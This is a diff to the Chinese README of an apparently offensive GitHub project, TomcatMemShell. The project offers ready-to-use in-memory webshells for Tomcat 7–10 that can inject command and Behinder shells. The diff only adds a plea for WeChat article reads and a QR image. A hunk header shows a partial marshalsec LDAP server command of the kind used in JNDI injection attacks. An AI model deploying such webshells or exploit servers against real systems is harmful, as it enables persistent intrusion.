@@ -1,7 +1,8 @@
 # TomcatMemShell
 拿来即用的Tomcat7/8/9/10版本Listener/Filter/Servlet内存马，支持注入CMD内存马和冰蝎内存马  
 
-原理及代码分析详见[《Tomcat Servlet-Api内存马总结及代码实现》](https://mp.weixin.qq.com/s/r-JHLX5UoccGNZCfJS3klg)
+原理及代码分析详见[《Tomcat Servlet-Api内存马总结及代码实现》](https://mp.weixin.qq.com/s/r-JHLX5UoccGNZCfJS3klg)  
+走过路过的师傅们可以用手机微信扫最底下的公众号二维码帮我冲一下阅读量，谢谢
 
 测试通过的Tomcat版本：  
 - **tomcat7.0.99**(2019-12-17)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat7.0.64**(2015-10-14)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat7.0.34**(2012-12-11)  
@@ -62,5 +63,6 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 仅供技术研究，请勿用于非法用途
 
 # 题外话
-觉得有帮助的话烦请给个star:wave:
+觉得有帮助的话烦请给个star:wave:   
+![barcode](https://user-images.githubusercontent.com/20917372/167749443-c4b968a0-ec35-4c20-81a9-bfa64a9ee876.png)
 
